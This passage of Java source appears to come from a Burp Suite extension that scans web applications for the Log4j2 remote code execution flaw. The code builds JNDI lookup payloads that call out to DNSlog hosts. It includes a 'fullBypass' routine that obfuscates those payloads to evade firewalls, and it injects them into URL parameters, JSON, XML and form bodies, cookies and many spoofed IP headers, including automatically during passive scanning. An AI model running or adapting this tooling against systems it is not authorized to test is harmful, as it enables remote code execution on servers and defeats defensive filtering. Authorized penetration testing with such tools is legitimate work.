                    && (request_header.get(i).contains("Referer:") || request_header.get(i).contains("referer:"))) {
                request_header.set(i, request_header.get(i) + vulnurl);
                continue;
            }
            if (this.isuseAccept && request_header.get(i).contains("Accept-Language:")) {
                request_header.set(i, request_header.get(i) + vulnurl);
                continue;
            }
            if (this.isuseAccept && request_header.get(i).contains("Accept:")) {
                request_header.set(i, request_header.get(i) + "," + vulnurl);
                continue;
            }
            if (this.isuseAccept && request_header.get(i).contains("Accept-Encoding:")) {
                request_header.set(i, request_header.get(i) + "," + vulnurl);
                continue;
            }
            if (this.isuseRefererOrigin && request_header.get(i).contains("Origin:")) {
                request_header.set(i, request_header.get(i) + "," + vulnurl);
                continue;
            }

            // delete original request header
            /***************** add header **********************/
            List<String> xff_lists = Arrays.asList("X-Forwarded", "X-Forwarded-Host",
                    "X-remote-IP", "X-remote-addr", "True-Client-IP", "Client-IP", "X-Real-IP",
                    "Ali-CDN-Real-IP", "Cdn-Src-Ip", "Cdn-Real-Ip", "CF-Connecting-IP", "X-Cluster-Client-IP",
                    "WL-Proxy-Client-IP", "Proxy-Client-IP", "Fastly-Client-Ip", "True-Client-Ip", "X-Originating-IP",
                    "X-Host", "X-Custom-IP-Authorization", "X-original-host", "X-forwarded-for");
            // "X-Requested-With",
            for (String xff : xff_lists) {
                if (request_header.get(i).contains(xff + ": "))
                    request_header.set(i, request_header.get(i) + vulnurl);
            }
            if (this.isuseAllCookie) {
                StringBuilder cookie_total = new StringBuilder();
                if (request_header.get(i).contains("cookie:") || request_header.get(i).contains("Cookie:")) {
                    // stdout.println("isuseallCookie:" + this.isuseAllCookie);
                    String cookies = request_header.get(i).replace("cookie:", "").replace("Cookie:", "");
                    String[] cookies_lists = cookies.split(";"); // split original cookie according to ";"
                    for (String cookie_single : cookies_lists) { // vuluerable every cookie
                        String[] cookie_single_lists = cookie_single.split("=");
                        cookie_total.append(cookie_single_lists[0]).append("=").append(vulnurl).append("; ");
                    }
                    request_header.set(i, "Cookie: " + cookie_total);
                    continue;
                }
            }
        }
        // for (String xff:xff_lists)
        // if (!request_header.contains(xff + ":") && this.isuseXfflists ) //
        // request_header.add(xff + ": 127.0.0.1 " + vulnurl_param(vulnurl,
        // param_i++,this.isipincreasing));
        // stdout.println("1238");
        // stdout.println(request_header.get(0));
        // customlists check
        if (customlists.length > 0 && !customlists[0].equals("")) {
            for (String customlists_single : customlists) // white list
            {
                if (!request_header.contains(customlists_single + ":"))
                    request_header.add(customlists_single + ": " + vulnurl);
            }
        }
        return request_header;
    }

    /**
     * url-encode string
     * 
     * @param value
     *              string to encode
     * @return encoded string
     */
    // url encode
    public static String urlEncode(String value) {
        StringBuffer sbu = new StringBuffer();
        char[] chars = value.toCharArray();
        for (int i = 0; i < chars.length; i++) {
            sbu.append('%');
            sbu.append(Integer.toHexString((int) chars[i]));
        }
        return sbu.toString();
    }

    /**
     * this function is used to apply bypass when the dnslog_protocol is set to 8:
     * **use ${randomstr : - } full bypass**
     * every letter will be encode as a pattern like ${XX:XX: - "real letter"}
     * 
     * the XX's length will between 0 and 2, cause 3-letters-length words like "env"
     * and "rmi" may alert firewall.
     * 
     * @param raw
     *            the raw payload
     * @return payload applyed full bypass tech
     */
    public String fullBypass(String raw) {
        Random rand = new Random();
        StringBuffer sbu = new StringBuffer();
        char[] chars = raw.toCharArray();
        for (int i = 0; i < chars.length; i++) {
            sbu.append("${");
            int random_num = rand.nextInt(3);// random_num in [0,3)
            for (int i2 = 0; i2 < random_num; i2++) {
                int random_num2 = rand.nextInt(3);// random_num in [0,3)
                sbu.append(RandomStringUtils.randomAlphanumeric(random_num2));
                sbu.append(':');
            }
            sbu.append('-');
            sbu.append(chars[i]);
            sbu.append('}');
        }
        return sbu.toString();
    }

    /**
     * use to generate final payload
     * 
     */
    public String generateVulnurl(String random_str) {
        String tempStr = this.myDnslogFactory.getDnslogUrl();
        if (this.dnslog_protocol_index == 8) {
            return fullBypass("${" + dnslog_protocol_list[1] + "//" + random_str + "." + tempStr + "}");
        } else {
            return "${"
                    + (this.dnslog_protocol_index == 0 ? this.custom_dnslog_protocol
                            : dnslog_protocol_list[this.dnslog_protocol_index])
                    + "//" + random_str + "." + tempStr + "}";
        }
    }

    /**
     * first,this function will url-encode your payload.
     * then for GET request url, inject vulnurl to GET-param.
     * 
     * @param vulnurl
     *                the log4j2 payload you generate
     * @param url
     *                IExtensionHelpers.analyzeRequest(IHttpRequestResponse.getRequest()).getHeaders().split("
     *                ")[1]
     *                for more info, see brup APIs
     * @return url_inject
     *         a url which GET-param is finishing vulnurl injection
     *         eg.http://1.1.1.1?paramA=%24%7b...
     */
    public String injectGet(String vulnurl, String url) {
        // DO NOT use burp url-encode, it cant full url encode
        // String vulnurl2 = this.helpers.urlEncode(vulnurl);
        String vulnurl2 = urlEncode(vulnurl);
        // no param
        if (!url.contains("?")) {
            url = url + vulnurl2;
        } else {
            String[] requris = url.split("\\?", 2);
            String uri_total = "";
            if (requris.length > 1) {
                String[] requries = requris[1].split("&");
                for (String uri_single : requries) {
                    String[] uri_single_lists = uri_single.split("=");
                    uri_total = uri_total + uri_single_lists[0] + "="
                            + vulnurl2 + "&";
                }
                uri_total = uri_total.substring(0, uri_total.length() - 1);
            }
            url = requris[0] + "?" + uri_total;
        }
        return url;
    }

    /**
     * check POST-body method and then
     * <P/>
     * -json eg.{"a":"1"} inject into every :""
     * <P/>
     * -xml <xmp>eg.<ID>1</ID> inject into every >(.*?)</</xmp>
     * <P/>
     * -param eg.a=b&c=d inject after every = except ={ and =<
     * <P/>
     * <xmp>there is situations like a=1&b=2&c=<?xml version="1.0"...or a
     * 1&b={"a":"123"}
     * it is considered too rare, so better test manually. logically this fuc will
     * still working.
     * </xmp>
     * 
     * @param vulnurl
     *                the log4j2 payload you generate
     * @param body
     *                String(baseRequestResponse.getRequest()).substring(this.helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset())
     *                for more info, see brup APIs
     * @return body_inject
     *         a request body which POST-param is finishing vulnurl injection
     */
    public String injectPost(String vulnurl, String body) {

        /*
         * must contains("{") and contains(":\"")
         * it may contains("=") because Base64-encode
         * 
         * inject here:
         * | |
         * {"a":" 111","b":" 22222"}
         */
        if (body.contains("{") && body.contains(":\"")) {
            String[] bodys_single = body.split(":\"");
            body = "";
            int i = 0;
            for (i = 0; i < bodys_single.length - 1; i++) {
                body = body + bodys_single[i] + ":\"" + vulnurl;
            }
            body = body + bodys_single[i];
        }
        /*
         * must contains("<") and contains("</")
         * it may contains("=") eg.<REQ name="1111">
         *
         * <?xml version="1.0" encoding = "UTF-8"?>
         * <COM>
         * <REQ name="111">
         * <USER_ID> yoyoketang</USER_ID>
         * |
         * inject here:
         */
        if (body.contains("<") && !body.contains("</")) {
            List<String> list = new ArrayList<String>();
            Pattern pattern = Pattern.compile(">(.*?)</");
            Matcher m = pattern.matcher(body);
            while (m.find()) {
                list.add(m.group(1));
                // System.out.println(m.group(1));
            }
            for (String str : list) {
                body = body.replace(">" + str + "</", ">" + str + vulnurl + "</");
            }
        }
        /*
         * must contains("=") and may contains("&")
         * NOT contains("\"")
         * need URL-encode
         * 
         * inject here:
         * | |
         * b= password&c= MTIzNDU%3d
         */
        if (body.contains("=") && !body.contains("\"")) {
            this.helpers.urlEncode(vulnurl);
            String[] bodys_single = body.split("=");
            body = "";
            int i = 0;
            for (i = 0; i < bodys_single.length - 1; i++) {
                body = body + bodys_single[i] + "=" + vulnurl;
            }
            body = body + bodys_single[i];
        }
        return body;
    }

    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {

        if (!BurpExtender.this.log4j2passivepattern_box.isSelected())
            return null; // dont use passive pattern 
        this.ispolling = true;
        byte[] request = baseRequestResponse.getRequest();
        URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
        IRequestInfo analyzedIRequestInfo = this.helpers.analyzeRequest(request);

        List<String> request_header = analyzedIRequestInfo.getHeaders();
        // request method
        String reqMethod = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
        IHttpService httpService = baseRequestResponse.getHttpService();
        String host = httpService.getHost();
        host = host + "." + httpService.getPort();
        String request_header_host = headers_to_host(request_header);

        // response can be null
        byte[] response = baseRequestResponse.getResponse();
        List<String> response_header = null;
        if (response != null) {
            IResponseInfo analyzedIResponseInfo = this.helpers.analyzeResponse(response);
            response_header = analyzedIResponseInfo.getHeaders();
        }
        String firstrequest_header = request_header.get(0);
        /**
         * firstheaders[0] => request method
         * firstheaders[1] => request uri
         * firstheaders[2] => request version (useless)
         */
        String[] firstheaders = firstrequest_header.split(" ");
        String uri = firstheaders[1].split("\\?", 2)[0].replace("/", ".");
        if (firstheaders[1].split("\\?")[0].replace("/", ".").length() > 25) {
            uri = firstheaders[1].split("\\?")[0].replace("/", ".").substring(0, 25);
        }
        /*
         * blacklist check
         * 1. host should not be dnslog platform
         * 2. host should not be in this.whitelists
         * 3. respone's Content-type should not be static file
         * 4. request should not be a req to static resources
         */
        if (host.equals("log.xn--9tr.com.80") || host.equals("log.xn--9tr.com") || host.equals("dnslog.cn")
                || host.equals("ceye.io"))
            return null;
        if (this.whitelists.length > 0 && !this.whitelists[0].equals("")) {
            for (String white_host_single : whitelists)
            {
                white_host_single = white_host_single.replace("*", "");
                String[] hostlists = host.split(":");
                if (hostlists[0].endsWith(white_host_single) || request_header_host.endsWith(white_host_single)) {
                    return null;
                }
            }
        }
        List<String> response_black_lists = Arrays.asList("Content-Type: image/jpeg", "Content-Type: image/jpg",
                "Content-Type: image/png", "Content-Type: application/octet-stream", "Content-Type: text/css");
        if (response_header != null) {
            for (String response_header_single : response_header) {
                for (String response_black_single : response_black_lists) {
                    if (response_black_single.equals(response_header_single))
                        return null;
                }
            }
        }
        List<String> blacklists = Arrays.asList(".js", ".jpg", ".png", ".jpeg", ".svg", ".mp4", ".css", ".mp3", ".ico",
                ".woff", ".woff2");
        for (String black_single : blacklists) {
            if (firstheaders[1].split("\\?")[0].endsWith(black_single))
                return null;
        }
        String total_uri = "";
        String[] uris = uri.split("\\.");
        for (String uri_single : uris) {
            if (!uri_single.equals(""))
                total_uri = total_uri + "." + uri_single.substring(0, 1);
        }
        uri = total_uri;
        if (uri.endsWith("."))
            uri = uri.substring(0, uri.length() - 1);
        // generate random string to identifier different target
        String random_str = RandomStringUtils.randomAlphanumeric(5).toLowerCase(); // dnslog will force to lowercase
        // create the vuln payload
        String vulnurl = generateVulnurl(random_str);
        // String vulnurl = "${" + this.custom_dnslog_protocol +
        // dnslog_protocol_list[this.dnslog_protocol_index] + "//" + random_str + "." +
        // this.logxn_dnslog + "}";

        int bodyOffset = analyzedIRequestInfo.getBodyOffset();
        byte[] byte_Request = baseRequestResponse.getRequest();
        String request2 = new String(byte_Request); // byte[] to String
        String body = request2.substring(bodyOffset);

        /*
         * first, encode your vulnurl
         * second, inject vulnurl to request.header
         * then, check request.method and inject
         * -GET only inject to GET-param
         * -POST check POST-body method
         * -json {a:"1"} inject into every :""
         * -xml <ID>1</ID> inject into every >(.*?)</
         * -param a=b&c=d inject after every = except ={ and =<
         * 
         * there is situations like a=1&b=2&c=<?xml version=¡°1.0¡± ... or a
         * 1&b={"a":"123"}
         * it is considered too rare, so better test manually. in my case, logically it
         * will working.
         * 
         * finally, do some last check
         */

        // inject vulnurl in request.url
        if (!reqMethod.contains("POST") && !reqMethod.contains("PUT")) {
            firstheaders[1] = injectGet(vulnurl, firstheaders[1]);
        } else {
            body = injectPost(vulnurl, body);
        }
        request_header.set(0, firstheaders[0] + " " + firstheaders[1] + " " + firstheaders[2]);
        request_header = injectHeader(vulnurl, request_header);

        IHttpRequestResponse newIHttpRequestResponse;
        byte[] newRequest = this.helpers.buildHttpMessage(request_header, body.getBytes());
        newIHttpRequestResponse = this.callbacks.makeHttpRequest(httpService, newRequest);
        byte[] response3 = newIHttpRequestResponse.getResponse();
        //Optimization of payload has been carried out. 
        //During testing on some systems, it has been found that the "$" symbol can cause requests to not be parsed. 
        //Specifically, this type of situation can be found in the intranet Seeyon A8 system. 
        //However, due to the VMWARE testing on the intranet, 
        //it has been found that if the "$" in the Content type is encoded with a URL, the vulnerability cannot be triggered. 
        //Therefore, the following changes have been added. 
        //The "$" in the request header carried by the normal uri request is encoded, 
        //The $in the request header carried by the header in the uri request header of the payload is not encoded.

        if (BurpExtender.this.myDnslogFactory.askDnslogRecordOnce(random_str)) {
            synchronized (this.Udatas) {
                // List<Object> mes = FindKey(newIHttpRequestResponse,
                // getRememberMeNumber(response));
                int row = this.Udatas.size();
                int statuscode = 0;
                if (response3 != null) {
                    statuscode = this.helpers.analyzeResponse(response3).getStatusCode();
                }
                this.Udatas.add(new TablesData(row, reqMethod, url.toString(),
                        statuscode != 0 ? statuscode + "" : "no respones",
                        "log4j2 rce ", random_str, newIHttpRequestResponse, httpService.getHost(),
                        httpService.getPort()));
                fireTableRowsInserted(row, row);
                List<IScanIssue> issues = new ArrayList<>(1);
                issues.add(new CustomScanIssue(
                        httpService,
                        url,
                        new IHttpRequestResponse[] { newIHttpRequestResponse },
                        "log4j2 RCE",
                        "log4j2 random is " + random_str,
                        "High"));
                if (!toHosts_vuln.contains(host.toLowerCase())) {
                    toHosts_vuln.add(host.toLowerCase());
                }

                this.ispolling = false;//not polling the host list
                return issues;
            }
        }
        return null;
    }

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        JMenuItem jMenuItem = new JMenuItem("Send to log4j2 Scanner");
        List<JMenuItem> jMenuItemList = new ArrayList<>();
        BurpExtender.this.ispolling = true; // use polling method defualtly 

        // JMenu jMenu = new JMenu("log4j2");
        // jMenu.add(jMenuItem);
        jMenuItemList.add(jMenuItem);

        // add Action Listener
        jMenuItem.addActionListener(a -> {
            
            IHttpRequestResponse iHttpRequestResponse = invocation.getSelectedMessages()[0];
            IRequestInfo iRequestInfo = this.helpers.analyzeRequest(iHttpRequestResponse);
            URL url = this.helpers.analyzeRequest(iHttpRequestResponse).getUrl();
            String reqMethod = this.helpers.analyzeRequest(iHttpRequestResponse).getMethod();
            // List<String> request_header = iRequestInfo.getHeaders();
            byte[] byte_Request = iHttpRequestResponse.getRequest();
            int bodyOffset = iRequestInfo.getBodyOffset();
            String request2 = new String(byte_Request); // byte[] to String
            String body = request2.substring(bodyOffset);

            IRequestInfo analyzedIRequestInfo = this.helpers.analyzeRequest(iHttpRequestResponse);

            List<String> request_header = analyzedIRequestInfo.getHeaders();

            IHttpService httpService = iHttpRequestResponse.getHttpService();
            String host = httpService.getHost();
            host = host + "." + httpService.getPort();
            final String new_host = host;
            String request_header_host = headers_to_host(request_header);

            // response can be null
            byte[] response = iHttpRequestResponse.getResponse();
            List<String> response_header = null;
            if (response != null) {
                IResponseInfo analyzedIResponseInfo = this.helpers.analyzeResponse(response);
                response_header = analyzedIResponseInfo.getHeaders();
            }
            String firstrequest_header = request_header.get(0);
            String[] firstheaders = firstrequest_header.split(" ");
            String uri = firstheaders[1].split("\\?", 2)[0].replace("/", ".");
            if (firstheaders[1].split("\\?")[0].replace("/", ".").length() > 25) {
                uri = firstheaders[1].split("\\?")[0].replace("/", ".").substring(0, 25);
            }

            /*
             * blacklist check
             * 1. host should not be dnslog platform
             * 2. host should not be in this.whitelists
             * 3. respone's Content-type should not be static file
             * 4. request should not be a req to static resources
             */
            if (host.equals("log.xn--9tr.com.80") || host.equals("log.xn--9tr.com") || host.equals("dnslog.cn")
                    || host.equals("ceye.io"))
                return;
            if (this.whitelists.length > 0 && !this.whitelists[0].equals("")) {
                for (String white_host_single : whitelists)
                {
                    white_host_single = white_host_single.replace("*", "");
                    String[] hostlists = host.split(":");
                    if (hostlists[0].endsWith(white_host_single) || request_header_host.endsWith(white_host_single)) {
                        return;
                    }
                }
            }
            List<String> response_black_lists = Arrays.asList("Content-Type: image/jpeg", "Content-Type: image/jpg",
                    "Content-Type: image/png", "Content-Type: application/octet-stream", "Content-Type: text/css");

            if (response_header != null) {
                for (String response_header_single : response_header) {
                    for (String response_black_single : response_black_lists) {
                        if (response_black_single.equals(response_header_single))
                            return;
                    }
                }
            }

            List<String> blacklists = Arrays.asList(".js", ".jpg", ".png", ".jpeg", ".svg", ".mp4", ".css", ".mp3",
                    ".ico", ".woff", ".woff2");
            for (String black_single : blacklists) {
                if (firstheaders[1].split("\\?")[0].endsWith(black_single))
                    return;
            }
            String total_uri = "";
            String[] uris = uri.split("\\.");
            for (String uri_single : uris) {
                if (!uri_single.equals(""))
                    total_uri = total_uri + "." + uri_single.substring(0, 1);
            }
            uri = total_uri;
            if (uri.endsWith("."))
                uri = uri.substring(0, uri.length() - 1);
            
            // generate random string to identifier different target
            String random_str = RandomStringUtils.randomAlphanumeric(5).toLowerCase(); // dnslog will force to lowercase
            // create the vuln payload

            // String vulnurl = "${" + this.custom_dnslog_protocol +
            // dnslog_protocol_list[this.dnslog_protocol_index] + "//" + random_str + "." +
            // this.logxn_dnslog + "}";
            
            String vulnurl = generateVulnurl(random_str);

            /*
             * first, encode your vulnurl
             * second, inject vulnurl to request.header
             * then, check request.method and inject
             * -GET only inject to GET-param
             * -POST check POST-body method
             * -json {a:"1"} inject into every :""
             * -xml <ID>1</ID> inject into every >(.*?)</
             * -param a=b&c=d inject after every = except ={ and =<
             * 
             * there is situations like a=1&b=2&c=<?xml version=¡°1.0¡± ... or a
             * 1&b={"a":"123"}
             * it is considered too rare, so better test manually. in my case, logically it
             * will working.
             * 
             * finally, do some last check
             */

            // inject vulnurl in request.url

            if (!reqMethod.contains("POST") && !reqMethod.contains("PUT")) {
                firstheaders[1] = injectGet(vulnurl, firstheaders[1]);
            } else {
                body = injectPost(vulnurl, body);
            }
            request_header.set(0, firstheaders[0] + " " + firstheaders[1] + " " + firstheaders[2]);

            // this.stdout.println(request_header.get(0));
            // this.stdout.println(request_header.size());
            // this.stdout.println(body.length());

            request_header = injectHeader(vulnurl, request_header);
            final List<String> new_request_header = request_header;
            final byte[] new_body = body.getBytes();
            new Thread() {
                public void run() {
                    IHttpRequestResponse newIHttpRequestResponse;
                    byte[] newRequest = BurpExtender.this.helpers.buildHttpMessage(new_request_header, new_body);
                    newIHttpRequestResponse = BurpExtender.this.callbacks.makeHttpRequest(httpService, newRequest);
                    // response can be null
                    byte[] response3 = newIHttpRequestResponse.getResponse();
                    //BurpExtender.this.stdout.println("response3");
                    synchronized (BurpExtender.this.Udatas) {
                        // List<Object> mes = FindKey(newIHttpRequestResponse,
                        // getRememberMeNumber(response));
                        int row = BurpExtender.this.Udatas.size();
                        int statuscode = 0;
                        if (response3 != null) {
                            statuscode = BurpExtender.this.helpers.analyzeResponse(response3).getStatusCode();
                        }

                        if (BurpExtender.this.myDnslogFactory.askDnslogRecordOnce(random_str)) {
                            BurpExtender.this.Udatas.add(new TablesData(row, reqMethod, url.toString(),
                                    statuscode != 0 ? statuscode + "" : "no respones",
                                    "log4j2 rce success!!!", random_str, newIHttpRequestResponse, httpService.getHost(),
                                    httpService.getPort()));
                            fireTableRowsInserted(row, row);
                            List<IScanIssue> issues = new ArrayList<>(1);
                            issues.add(new CustomScanIssue(httpService, url,
                                    new IHttpRequestResponse[] { newIHttpRequestResponse }, "log4j2 RCE",
                                    "log4j2 random is " + random_str, "High"));
                        } else {
                            BurpExtender.this.Udatas.add(new TablesData(row, reqMethod, url.toString(),
                                    statuscode != 0 ? statuscode + "" : "no respones",
                                    "log4j2 not vuln ", random_str, newIHttpRequestResponse, httpService.getHost(),
                                    httpService.getPort()));
                            fireTableRowsInserted(row, row);
                        }
                        if (!toHosts_vuln.contains(new_host.toLowerCase()))
                            toHosts_vuln.add(new_host.toLowerCase());
                    }
                }
            }.start();
        });
        return jMenuItemList;
    }

    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
            IScannerInsertionPoint insertionPoint) {
        return null;
    }

    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (existingIssue.getIssueName().equals(newIssue.getIssueName()))
            return -1;
        return 0;
    }

    public IHttpService getHttpService() {
        return this.currentlyDisplayedItem.getHttpService();
    }

    public byte[] getRequest() {
        return this.currentlyDisplayedItem.getRequest();
    }

    public byte[] getResponse() {
        return this.currentlyDisplayedItem.getResponse();
    }

    public String getTabCaption() {
        return "log4j2 RCE";
    }

    public Component getUiComponent() {
        return this.mjSplitPane;
    }

    public int getRowCount() {
        return this.Udatas.size();
    }

    public int getColumnCount() {
        return 6;
    }

    public String getColumnName(int columnIndex) {
        switch (columnIndex) {
            case 0:
                return "#";
            case 1:
                return "Method";
            case 2:
                return "URL";
            case 3:
                return "Status";
            case 4:
                return "Issue";
            case 5:
                return "Random";
        }
        return null;
    }

    public Object getValueAt(int rowIndex, int columnIndex) {
        TablesData datas = this.Udatas.get(rowIndex);
        switch (columnIndex) {
            case 0:
                return Integer.valueOf(datas.Id);
            case 1:
                return datas.Method;
            case 2:
                return datas.URL;
            case 3:
                return datas.Status;
            case 4:
                return datas.issue;
            case 5:
                return datas.random;
        }
        return null;
    }

    public class URLTable extends JTable {
        public URLTable(TableModel tableModel) {
            super(tableModel);
        }

        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            BurpExtender.TablesData dataEntry = BurpExtender.this.Udatas.get(convertRowIndexToModel(row));
            BurpExtender.this.HRequestTextEditor.setMessage(dataEntry.requestResponse.getRequest(), true);
            BurpExtender.this.HResponseTextEditor.setMessage(dataEntry.requestResponse.getResponse(), false);
            BurpExtender.this.currentlyDisplayedItem = dataEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }

    public static class TablesData {
        final int Id;

        final String Method;

        final String URL;

        final String Status;

        final String issue;

        final IHttpRequestResponse requestResponse;

        final String host;

        final int port;

        final String random;

        public TablesData(int id, String method, String url, String status, String issue, String random,
                IHttpRequestResponse requestResponse, String host, int port) {
            this.Id = id;
            this.Method = method;
            this.URL = url;
            this.Status = status;
            this.issue = issue;
            this.requestResponse = requestResponse;
            this.host = host;
            this.port = port;
            this.random = random;
        }
    }
        class CustomScanIssue implements IScanIssue {
            private IHttpService httpService;
            private URL url;
            private IHttpRequestResponse[] httpMessages;
            private String name;
            private String detail;
            private String severity;

            /**
             *
             * @param httpService  httpService
             * @param url          url
             * @param httpMessages httpMessages
             * @param name         vulnerability name
             * @param detail       vulnerability detail
             * @param severity     vulnerability severity
             */
            public CustomScanIssue(
                    IHttpService httpService,
                    URL url,
                    IHttpRequestResponse[] httpMessages,
                    String name,
                    String detail,
                    String severity) {
                this.httpService = httpService;
                this.url = url;
                this.httpMessages = httpMessages;
                this.name = name;
                this.detail = detail;
                this.severity = severity;
            }

            public URL getUrl() {
                return url;
            }

            public String getIssueName() {
                return name;
            }

            public int getIssueType() {
                return 0;
            }

            public String getSeverity() {
                return severity;
            }

            public String getConfidence() {
                return "Certain";
            }

            public String getIssueBackground() {
                return null;
            }

            public String getRemediationBackground() {
                return null;
            }

            public String getIssueDetail() {
                return detail;
            }

            public String getRemediationDetail() {
                return null;
            }

            public IHttpRequestResponse[] getHttpMessages() {
                return httpMessages;
            }

            public IHttpService getHttpService() {
                return httpService;
            }
        }

    
}